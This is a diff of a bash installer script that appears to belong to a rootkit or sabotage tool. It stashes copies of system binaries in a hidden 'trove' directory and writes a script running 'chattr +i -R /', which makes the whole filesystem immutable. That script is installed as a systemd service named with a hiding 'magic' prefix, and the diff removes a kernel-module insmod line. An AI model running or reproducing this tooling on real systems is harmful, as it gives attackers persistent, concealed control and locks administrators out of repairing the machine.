@@ -1,5 +1,9 @@
 #!/bin/bash
 
+magicPrefix=$(awk '/MAGIC_PREFIX/{print $3}' "$hFile" | tr -d '"')
+thisDirPath=$(pwd)
+thisDir=${PWD##*/}
+
 # Copy all commands in /usr/bin to trove dir
 trovePath="$thisDirPath/$magicPrefix""trove"
 if $makeImmutable; then
@@ -12,7 +16,6 @@ fi
 touch immute.sh
 chmod +x immute.sh
 echo "#!/bin/bash" >> immute.sh
-echo "insmod $thisDirPath/$koFile" >> immute.sh
 echo "$trovePath/chattr +i -R /" >> immute.sh
 immutePath="$thisDirPath/immute.sh"
 immuteServicePath="/etc/systemd/system/""$magicPrefix""immute.service"
